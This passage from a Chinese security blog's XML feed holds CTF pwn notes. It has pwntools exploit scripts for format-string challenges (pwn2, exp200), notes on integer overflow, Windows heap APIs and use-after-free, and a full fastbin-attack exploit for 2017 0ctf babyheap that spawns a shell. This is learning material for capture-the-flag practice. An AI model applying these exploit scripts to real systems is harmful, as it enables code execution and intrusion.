class="token string">'aa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>strlen_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x84f0</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%12$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x10804</span><span class="token operator">-</span><span class="token number">0x84f0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%13$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x8490</span><span class="token operator">-</span><span class="token number">0x804</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%14$hn'</span><span class="token triple-quoted-string string">'''payload = 'aa' + p32(fini_array) + p32(strlen_got)payload += '%' + str(0x84f0-28) + 'c%12$hn'payload += '%' + str(0x18490-0x84f0) + 'c%13$hn''''</span><span class="token comment" spellcheck="true">#print(payload)</span><span class="token triple-quoted-string string">'''io.recv()io.sendline(payload)io.recv()io.sendline('/bin/sh\x00')'''</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name...'</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name...'</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考网页：</strong></p><p><a href="https://blog.csdn.net/aaa15893831716/article/details/102408208" target="_blank" rel="noopener">https://blog.csdn.net/aaa15893831716/article/details/102408208</a></p><h3 id="0x06-pwn2"><a href="#0x06-pwn2" class="headerlink" title="0x06 pwn2"></a>0x06 pwn2</h3><ul><li>栈偏移为7</li><li>难点在于程序中没有system函数，需要将其泄漏出来</li></ul><p><strong>DynELF函数使用方法</strong></p><ol><li><p>设置指针</p><pre class="line-numbers language-python"><code class="language-python">e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>写leak函数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">'%8$s'</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'\x00'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据题目不同，这里构造payload的方式也不同</p></li><li><p>调用DynELF函数</p><pre class="line-numbers language-python"><code class="language-python">d<span class="token operator">=</span>DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取system地址</p><pre class="line-numbers language-python"><code class="language-python">system_addr <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">'%8$s'</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'\x00'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>d<span class="token operator">=</span>DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>e<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x06-exp200"><a href="#0x06-exp200" class="headerlink" title="0x06 exp200"></a>0x06 exp200</h3><ul><li>偏移为8</li><li>程序中有system(“/bin/sh”)</li><li>将exit劫持到system(“/bin/sh”)处即可</li><li>只需要覆盖低4位，因为高4位相同，但在IDA中似乎看不出来，可能需要动态调试</li><li>全部覆盖也没有关系，只是时间长一点而已</li><li>注意要sleep一会儿之后发送’\x00’，否则不会exit</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'exp200'</span><span class="token punctuation">)</span>system_binsh <span class="token operator">=</span> <span class="token number">0x4006df</span>exit_got <span class="token operator">=</span> <span class="token number">0x601020</span>payload <span class="token operator">=</span> <span class="token string">'aa%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x4006df</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$n'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>exit_got<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整型溢出</title>
      <link href="/2020/01/17/zheng-xing-yi-chu/"/>
      <url>/2020/01/17/zheng-xing-yi-chu/</url>
      
        <content type="html"><![CDATA[<h3 id="整形溢出漏洞"><a href="#整形溢出漏洞" class="headerlink" title="整形溢出漏洞"></a>整形溢出漏洞</h3><p><strong>1、存储溢出</strong></p><pre class="line-numbers language-C"><code class="language-C">int len1 = 0x10000;short len2 = len1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>len1是32位，len2是16位，len2无法容纳len1的全部位，导致结果与预期不一致，len2=0</p><pre class="line-numbers language-C"><code class="language-C">short len2 = 1;int len1 = len2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>len2是16位，len1是32位，把len2赋值给len1只能覆盖其低16位，在len1初始值为0xffffffff的情况下，可能导致len1=0xffff0001</p><p><strong>2、运算溢出</strong></p><p>在对整型变量的运算过程中没有考虑其边界范围，造成运算后的数值超出了其存储空间</p><p><strong>3、符号问题</strong></p><ul><li>整型数分为有符号整型和无符号整型</li><li>一般来说，长度变量都使用无符号整型，如果出现负数会产生溢出</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 整型溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN入门——堆</title>
      <link href="/2020/01/16/pwn-ru-men-dui/"/>
      <url>/2020/01/16/pwn-ru-men-dui/</url>
      
        <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><ul><li>堆是向高地址扩展的（便利也是由低向高进行）</li><li>堆是不连续的</li><li>使用链表来管理</li></ul><p><img src="%E5%A0%86-%E9%93%BE%E8%A1%A8.jpg" alt="堆-链表"></p><h3 id="HeapCreate函数（创建堆）"><a href="#HeapCreate函数（创建堆）" class="headerlink" title="HeapCreate函数（创建堆）"></a>HeapCreate函数（创建堆）</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><strong>DWORD flOptions</strong></p><p>可以设定0、HEAP_CREATE_ENABLE_EXECUTE、HEAP_GENERATE_EXCEPTIONS、HEAP_NO_SERIALIZE，也可以将它们混合使用</p><p>HEAP_CREATE_ENABLE_EXECUTE</p><p>0x00040000</p><p>设置堆中数据为可执行代码</p><p>HEAP_GENERATE_EXCEPTIONS</p><p>0x00000004</p><p>当堆分配内存失败时会抛出异常，若不设置则返回NULL</p><p>HEAP_NO_SERIALIZE</p><p>0x00000001</p><p>对堆的访问是非独占的，如果一个进程没有完成对堆的操作，其他线程也可以进行堆操作。非常危险，尽量避免使用</p><p><strong>SIZE_T dwInitialSize</strong></p><p>开始时分配给堆的字节数</p><p><strong>SIZE_T dwMaximumSize</strong></p><p>堆能增长到的最大大小</p><p>若为0表示堆可以在需要的情况下不断增长</p><p><strong>参考网页：</strong></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/heapapi/nf-heapapi-heapcreate（英文官方文档）" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/heapapi/nf-heapapi-heapcreate（英文官方文档）</a></p><p><a href="https://baike.baidu.com/item/HeapCreate/4472531?fr=aladdin（百度百科）" target="_blank" rel="noopener">https://baike.baidu.com/item/HeapCreate/4472531?fr=aladdin（百度百科）</a></p><p><a href="https://www.cnblogs.com/kekoukele987/p/7304869.html（比百度百科详细的博客）" target="_blank" rel="noopener">https://www.cnblogs.com/kekoukele987/p/7304869.html（比百度百科详细的博客）</a></p><h3 id="HeapAlloc函数（在指定堆上分配内存）"><a href="#HeapAlloc函数（在指定堆上分配内存）" class="headerlink" title="HeapAlloc函数（在指定堆上分配内存）"></a>HeapAlloc函数（在指定堆上分配内存）</h3><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p><strong>HANDLE hHeap</strong></p><p>堆内存开始的位置（句柄）</p><p><strong>DWORD dwFlags</strong></p><p>堆分配时的可选参数</p><p>HEAP_GENERATE_EXCEPTIONS</p><p>0x00000004</p><p>分配错误抛出异常</p><p>HEAP_NO_SERIALIZE</p><p>0x00000001</p><p>不使用连续存取</p><p>HEAP_REALLOC_IN_PLACE_ONLY</p><p>0x00000010</p><p>内存块被加大时不移动堆中的内存块</p><p>HEAP_ZERO_MEMORY</p><p>0x00000008</p><p>将分配的内存全部置0</p><p><strong>SIZE_T dwBytes</strong></p><p>要分配的字节数</p><p><strong>参考网页：</strong></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/heapapi/nf-heapapi-heaprealloc（英文官方文档）" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/heapapi/nf-heapapi-heaprealloc（英文官方文档）</a></p><p><a href="https://baike.baidu.com/item/HeapAlloc/7756628?fr=aladdin（百度百科）" target="_blank" rel="noopener">https://baike.baidu.com/item/HeapAlloc/7756628?fr=aladdin（百度百科）</a></p><p><a href="https://blog.csdn.net/liulina603/article/details/17991731（HeapAlloc与malloc的区别）" target="_blank" rel="noopener">https://blog.csdn.net/liulina603/article/details/17991731（HeapAlloc与malloc的区别）</a></p><h3 id="HeapFree函数（释放堆内存）"><a href="#HeapFree函数（释放堆内存）" class="headerlink" title="HeapFree函数（释放堆内存）"></a>HeapFree函数（释放堆内存）</h3><h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><p><strong>HANDLE hHeap</strong></p><p>将要被释放的内存块的堆的句柄</p><p><strong>DWORD dwFlags</strong></p><p>堆释放选项，当使用HeapCreate函数创建堆时，使用以下值来覆盖相应的在flOptions中指定的值</p><p>HEAP_NO_SERIALIZE</p><p>0x00000001</p><p><strong>LPVOID lpMem</strong></p><p>指向要释放的内存块的指针</p><p><strong>参考网页：</strong></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/heapapi/nf-heapapi-heapfree（英文官方文档）" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/heapapi/nf-heapapi-heapfree（英文官方文档）</a></p><p><a href="https://baike.baidu.com/item/HeapFree/14895175?fr=aladdin（百度百科）" target="_blank" rel="noopener">https://baike.baidu.com/item/HeapFree/14895175?fr=aladdin（百度百科）</a></p><p><a href="https://blog.csdn.net/hyczwl/article/details/12277315（CSDN博客）" target="_blank" rel="noopener">https://blog.csdn.net/hyczwl/article/details/12277315（CSDN博客）</a></p><h3 id="堆溢出利用方法"><a href="#堆溢出利用方法" class="headerlink" title="堆溢出利用方法"></a>堆溢出利用方法</h3><p>给堆里面的变量赋予超过其分配的空间大小的值，将后续链表数据覆盖</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>书中P553</p><p>为b分配内存时使用了HEAP_ZERO_MEMORY，但为什么没有将内存清零？</p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>HEAP_ZERO_MEMORY指挥清零Data区，Header头和Flink/Blink不归HeapAlloc函数管</p><h3 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h3><ul><li>Use-After-Free 释放后被重用</li><li>例：A先后调用BCD这3个子函数</li><li>B会把A的某个资源释放；C分配内存，会占用B释放的空间；D判断不严谨，即使B把A的资源释放后依然引用它</li><li>利用方法：</li><li>先让A调用B，B会把A的某个指针释放</li><li>再执行C，占用刚才被释放的空间并控制这块内存</li><li>最后调用D，由于检查不严格，调用了已经被释放的指针，而该指针已经在C中被重用了，导致漏洞被利用</li><li>如何防范：在使用之前判断指针是否有效</li></ul><h3 id="malloc和calloc的区别"><a href="#malloc和calloc的区别" class="headerlink" title="malloc和calloc的区别"></a>malloc和calloc的区别</h3><h5 id="1、参数个数上的区别："><a href="#1、参数个数上的区别：" class="headerlink" title="1、参数个数上的区别："></a>1、参数个数上的区别：</h5><p>malloc函数：malloc(size_t size)函数有一个参数，即要分配的内存空间的大小。</p><p>calloc函数：calloc(size_t numElements,size_t sizeOfElement)有两个参数，分别为元素的数目和每个元素的大小，这两个参数的乘积就是要分配的内存空间的大小。</p><h5 id="2、初始化内存空间上的区别："><a href="#2、初始化内存空间上的区别：" class="headerlink" title="2、初始化内存空间上的区别："></a>2、初始化内存空间上的区别：</h5><p>malloc函数：不能初始化所分配的内存空间，在动态分配完内存后，里边数据是随机的垃圾数据。</p><p>calloc函数：能初始化所分配的内存空间，在动态分配完内存后，自动初始化该内存空间为零。</p><h5 id="3、函数返回值上的区别："><a href="#3、函数返回值上的区别：" class="headerlink" title="3、函数返回值上的区别："></a>3、函数返回值上的区别：</h5><p>malloc函数：函数返回值是一个对象。</p><p>calloc函数：函数返回值是一个数组。</p><h3 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = "debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span>offset_libc <span class="token operator">=</span> <span class="token number">0x3c4b20</span><span class="token keyword">def</span> <span class="token function">allo</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    allo<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.0</span>    allo<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.1</span>    allo<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.2</span>    allo<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.3</span>    allo<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.4</span>    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>    fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>    fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    allo<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.1</span>    allo<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.2(4)</span>    allo<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.5</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>    fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: \n'</span><span class="token punctuation">)</span>    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> leakleak <span class="token operator">=</span> leak_libc<span class="token punctuation">(</span><span class="token punctuation">)</span>main_arena <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">88</span>libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> offset_libc<span class="token comment" spellcheck="true">#print('libc base:' + hex(libc_base))</span><span class="token comment" spellcheck="true">#print('main arena:' + hex(main_arena))</span>allo<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.4</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>fake_chunk <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x33</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allo<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.4</span>allo<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#no.6</span>one_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_addr<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allo<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路见ctfwiki：</p><p><a href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/#2017-0ctf-babyheap" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/fastbin_attack/#2017-0ctf-babyheap</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《加密与解密》读书笔记</title>
      <link href="/2020/01/06/jia-mi-yu-jie-mi-du-shu-bi-ji/"/>
      <url>/2020/01/06/jia-mi-yu-jie-mi-du-shu-bi-ji/</url>
      
